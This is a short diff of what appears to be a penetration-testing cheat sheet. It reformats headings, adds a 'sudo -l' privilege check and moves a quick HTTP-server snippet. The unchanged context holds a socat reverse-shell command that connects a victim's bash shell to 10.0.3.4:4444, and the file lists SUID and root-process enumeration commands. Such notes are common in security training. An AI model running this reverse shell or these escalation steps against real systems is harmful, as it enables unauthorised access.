@@ -34,17 +34,17 @@ victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
 ## Useful enumeration comands
-### List all processes runing as root
+List all processes runing as root
 ```
 ps -aux | grep root
 ```
-### List all executibles with SUID set
+List all executibles with SUID set
 ```
 find / -perm -u=s -type f 2>/dev/null
 ```
-### Start a quick HTTP server
+List what can be run with higher privileges
 ```
-python3 -m http.server [PORT]
+sudo -l
 ```
 ## Usefull common Linux commands
 
@@ -64,4 +64,8 @@ Only show matches
 ```
 2> /dev/null
 ```
-
+## Python helper
+Start a quick HTTP server
+```
+python3 -m http.server [PORT]
+```
